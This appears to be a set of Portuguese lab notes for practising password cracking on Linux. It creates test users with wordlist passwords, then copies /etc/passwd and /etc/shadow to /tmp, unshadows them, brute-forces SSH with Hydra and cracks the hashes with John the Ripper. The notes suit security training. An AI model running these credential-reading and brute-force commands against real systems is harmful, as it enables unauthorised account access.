## Lista de nomes de usuários
```
USERNAMES=("aline" "adriano" "beatriz" "breno" "claudia" "carlos" "douglas" "daniele" "emilia" "eduardo" "fernando" "flavia" "geraldo" "gisele" "heitor" "helena" "isabela" "igor" "jorge" "julia" "laura" "leonardo" "marcos" "maria" "natasha" "nicolas" "oswaldo" "odete" "paula" "pedro" "ricardo" "rafaela" "sandra" "samuel" "talita" "tiago" "ursula" "umberto" "vania" "valdir" "zilda" "zacarias")
```
## Criar usuários no Linux e definir senhas via wordlist
```
sudo bash -c " \
for user in $USERNAMES; do 
	useradd \$user; 
	password=\$(shuf -n 1 /home/user/passwd-list.txt); 
	echo \$user:\$password | chpasswd; 
	echo Creating user \"\$user\"...; 
done ;

echo 'All done!'
"
```
## Copiar arquivos de usuários e senhas do Linux para pasta tmp
```
sudo bash -c " \
cp /etc/passwd /tmp/passwd
cp /etc/shadow /tmp/shadow
"
```
## Converter arquivos de hash para o formato compativel do John The Ripper
```
sudo bash -c " \
unshadow /tmp/passwd /tmp/shadow > /tmp/hashes
"
```
## Executar Hydra para quebrar senhas de usuários via SSH
```
hydra -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
```
## Executar John The Ripper para quebrar hashs das senhas dos usuários
```
john /tmp/hashes --wordlist=/usr/share/wordlists/john.lst --format=crypt
```
